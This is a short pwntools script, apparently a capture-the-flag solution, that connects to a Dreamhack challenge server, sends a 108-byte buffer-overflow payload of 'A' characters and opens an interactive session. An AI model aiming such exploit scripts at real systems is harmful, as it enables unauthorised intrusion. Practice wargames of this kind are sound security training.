from pwn import *
import time

ADDRESS = "host3.dreamhack.games"
PORT = 22650
#p = process('./chall')
p = remote(ADDRESS, PORT)

payload = b'A' * 108
time.sleep(1)
p.sendline(payload)
p.interactive()